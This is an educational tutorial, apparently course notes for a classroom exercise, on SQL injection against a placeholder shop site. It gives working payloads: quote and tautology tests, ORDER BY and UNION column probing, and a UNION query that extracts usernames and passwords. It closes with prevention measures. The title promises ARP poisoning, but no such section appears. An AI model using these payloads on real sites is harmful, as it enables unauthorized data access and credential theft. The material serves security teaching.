
# Cybersecurity Threats: SQL Injection and ARP Poisoning

## Disclaimer
This information is provided for educational purposes only. Understanding these attacks is crucial for developing effective defenses. Unauthorized access to or modification of computer systems is illegal and unethical. Always ensure you have explicit permission before performing any security testing.

---

## I. SQL Injection (SQLi)

### A. What is SQL Injection?
SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It typically involves an attacker sending malicious SQL code (payload) via an input field, which the application then includes in a database query. If not properly sanitized or parameterized, this injected code can alter the query's logic, allowing the attacker to:
*   Bypass authentication.
*   View, modify, or delete data.
*   Execute administrative operations on the database (e.g., shutdown DBMS).
*   In some cases, issue commands to the operating system.

The vulnerability lies in the web application's code, specifically how it constructs SQL queries based on user input, not in the SQL database itself.

### B. The Scenario (from TD Exercice 01)
Consider a web application with the following URL for displaying products in the "Gifts" category:
`https://insecure-website.com/products?category=Gifts`

This URL triggers the following SQL query:
**Original intended query:**
```sql
SELECT id, nom, category, price FROM products WHERE category = 'Gifts' AND released = 1
```
The application dynamically constructs this query, likely using a template like:
**Query template:**
```sql
SELECT id, nom, category, price FROM products WHERE category = "$category" AND released = 1
```
where `$category` is replaced by the user-supplied value from the URL.

### C. How to Perform SQL Injection (Process & Syntax)

**1. Verifying Vulnerability (TD Question 1)**
The simplest way to test for SQLi is to try to break the SQL syntax or inject a condition that is always true (a tautology).

*   **Input to test:** `'` (a single quote)
    *   **URL:** `https://insecure-website.com/products?category=Gifts'`
    *   **Resulting SQL:**
        ```sql
        SELECT id, nom, category, price FROM products WHERE category = 'Gifts'' AND released = 1
        ```
        This will likely cause a SQL syntax error because of the extra quote, indicating the input is being directly inserted.

*   **Input for Tautology (always true condition):** `' OR '1'='1`
    This attempts to close the string for `category` and add an `OR` condition that is always true. To ensure the rest of the original query doesn't interfere, we comment it out. Common SQL comment characters are `-- ` (note the space after `--`) or `#`.
    *   **Payload:** `Gifts' OR '1'='1' -- `
    *   **URL:** `https://insecure-website.com/products?category=Gifts' OR '1'='1' -- `
    *   **Resulting SQL:**
        ```sql
        SELECT id, nom, category, price FROM products WHERE category = 'Gifts' OR '1'='1' -- " AND released = 1
        ```
        The `-- ` comments out `AND released = 1`. The condition `'Gifts' OR '1'='1'` becomes `'Gifts' OR TRUE`, which is `TRUE`.
        If this query returns all products, or at least more products than just "Gifts", the site is vulnerable.

**2. Displaying All Products (TD Question 2)**
This is similar to the tautology test. The goal is to make the `WHERE` clause evaluate to true for all rows, or bypass the category filter entirely.
*   **Payload:** `anything' OR '1'='1' -- `
    *   **URL:** `https://insecure-website.com/products?category=anything' OR '1'='1' -- `
    *   **Resulting SQL:**
        ```sql
        SELECT id, nom, category, price FROM products WHERE category = 'anything' OR '1'='1' -- " AND released = 1
        ```
    This effectively retrieves all products because `'1'='1'` is always true and the `AND released = 1` part is commented out. The `released = 1` condition in the original query is also bypassed.

**3. Retrieving Data from Other Tables (UNION-based SQLi - TD Question 4)**
The `UNION` operator allows combining the result sets of two or more `SELECT` statements. For a `UNION` to work:
    *   Both queries must return the same number of columns.
    *   The data types of corresponding columns must be compatible.

The goal is to retrieve data from the `user` table: `user (id, name, utilisateur, password, type_account, date)`. The original query retrieves 4 columns: `id, nom, category, price`.

*   **Step 1: Determine the number of columns in the original query.**
    We can use `ORDER BY` or `UNION SELECT` with `NULL`s.
    *   Try `ORDER BY`:
        `https://insecure-website.com/products?category=Gifts' ORDER BY 1 -- ` (Should work)
        `https://insecure-website.com/products?category=Gifts' ORDER BY 4 -- ` (Should work if 4 columns)
        `https://insecure-website.com/products?category=Gifts' ORDER BY 5 -- ` (Should error if only 4 columns)
    *   Alternatively, using `UNION SELECT NULL` iteratively:
        `https://insecure-website.com/products?category=Gifts' UNION SELECT NULL -- ` (Error if >1 column)
        `https://insecure-website.com/products?category=Gifts' UNION SELECT NULL,NULL -- ` (Error if >2 columns)
        `https://insecure-website.com/products?category=Gifts' UNION SELECT NULL,NULL,NULL -- ` (Error if >3 columns)
        `https://insecure-website.com/products?category=Gifts' UNION SELECT NULL,NULL,NULL,NULL -- ` (If this works without error, there are 4 columns)

*   **Step 2: Craft the UNION query.**
    Assuming we found 4 columns. We want `name, utilisateur, password, type_account` from the `user` table. These are 4 columns, perfect. To ensure only results from our injected query are shown, we can make the first part of the `WHERE` clause false (e.g., by using a non-existent category).
    *   **Payload:** `nonexistentcategory' UNION SELECT name, utilisateur, password, type_account FROM user -- `
    *   **URL:** `https://insecure-website.com/products?category=nonexistentcategory' UNION SELECT name, utilisateur, password, type_account FROM user -- `
    *   **Resulting SQL:**
        ```sql
        SELECT id, nom, category, price FROM products
        WHERE category = 'nonexistentcategory' -- This part will return 0 rows from 'products'
        UNION
        SELECT name, utilisateur, password, type_account FROM user -- This part fetches from 'user'
        -- " AND released = 1 -- This is commented out
        ```
    The application will then display user names, usernames, passwords, and account types in the columns normally used for product ID, name, category, and price.

### D. Types of SQL Injection
*   **In-band (Classic) SQLi:**
    *   **Error-based:** Attacker forces the database to generate an error message that leaks information.
    *   **UNION-based:** (As shown above) Uses `UNION` to combine legitimate results with results from a forged query.
*   **Inferential (Blind) SQLi:** Attacker sends queries and observes the application's response and behavior to infer information, as no data is directly returned.
    *   **Boolean-based:** Injects a condition and observes if the page content changes (e.g., "product found" vs "product not found").
    *   **Time-based:** Injects a command that causes a time delay (e.g., `SLEEP(5)`), then observes if the response is delayed.
*   **Out-of-band SQLi:** Data is exfiltrated through a different channel (e.g., DNS or HTTP requests to an attacker-controlled server).

### E. Prevention and Mitigation
1.  **Parameterized Queries (Prepared Statements):** This is the most effective method. The SQL query structure is pre-compiled, and user input is treated strictly as data, not executable code.
2.  **Input Validation and Sanitization:**
    *   **Validation:** Check if input matches expected format/type (e.g., numbers, specific characters).
    *   **Sanitization:** Escape special SQL characters (e.g., `'`, `"`, `;`, `--`) in user input before including it in a query. This is a fallback, less robust than parameterized queries.
3.  **Principle of Least Privilege:** The database account used by the web application should only have the minimum necessary permissions.
4.  **Web Application Firewalls (WAFs):** Can detect and block common SQLi patterns but are not foolproof.
5.  **Regular Security Audits and Code Reviews.**

---

